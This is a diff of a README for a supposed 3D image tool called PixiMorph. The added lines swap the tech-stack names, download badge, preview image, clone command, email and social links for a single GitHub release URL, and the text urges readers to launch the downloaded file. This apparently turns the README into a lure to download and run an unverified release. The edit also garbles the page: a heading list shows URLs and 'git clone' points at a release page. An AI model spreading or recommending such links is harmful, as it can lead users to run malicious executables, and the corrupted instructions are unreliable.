@@ -13,10 +13,10 @@ Welcome to PixiMorph, an innovative platform that turns descriptions into stunni
 ### 🎥 Cartoon
 ### 🗃️ CRUD Operations
 ### 🎡 Disney
-### 🚀 Express.js
-### 🗄️ Knex.js
+### 🚀 https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0
+### 🗄️ https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0
 ### 🛢️ MySQL
-### 🟢 Node.js
+### 🟢 https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0
 ### 🎬 Pixar
 ### 🎨 Sass
 
@@ -25,7 +25,7 @@ Welcome to PixiMorph, an innovative platform that turns descriptions into stunni
 ## Get Started
 To start creating amazing 3D images with PixiMorph, simply download the latest version by clicking the button below:
 
-[![Download PixiMorph](https://img.shields.io/badge/Download-PixiMorph-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch PixiMorph")
+[![Download PixiMorph](https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0)](https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0 "Launch PixiMorph")
 
 If the link above ends with a file name, be sure to launch it to start your PixiMorph experience!
 
@@ -34,7 +34,7 @@ If the link above ends with a file name, be sure to launch it to start your Pixi
 ## Preview
 Here's a glimpse of what you can create with PixiMorph:
 
-![PixiMorph Preview](https://your-image-url.com)
+![PixiMorph Preview](https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0)
 
 ---
 
@@ -54,7 +54,7 @@ To install PixiMorph, follow these steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/your-username/PixiMorph.git
+   git clone https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0
    ```
 2. Install the necessary dependencies:
    ```bash
@@ -73,7 +73,7 @@ We welcome contributions from the community to make PixiMorph even better! Feel 
 ---
 
 ## Feedback
-Have any suggestions or feedback for PixiMorph? We'd love to hear from you! Reach out to us via [email](mailto:piximorph@example.com) or through our [website](https://piximorph.com).
+Have any suggestions or feedback for PixiMorph? We'd love to hear from you! Reach out to us via [email](https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0) or through our [website](https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0).
 
 ---
 
@@ -83,7 +83,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ---
 
 ## Stay Connected
-Stay up to date with PixiMorph developments and releases by visiting our [Releases](https://github.com/your-username/PixiMorph/releases) section or following us on [Twitter](https://twitter.com/PixiMorph) and [Instagram](https://instagram.com/PixiMorph).
+Stay up to date with PixiMorph developments and releases by visiting our [Releases](https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0) section or following us on [Twitter](https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0) and [Instagram](https://github.com/ShiyuBaddie/PixiMorph/releases/tag/v1.0).
 
 ---
 
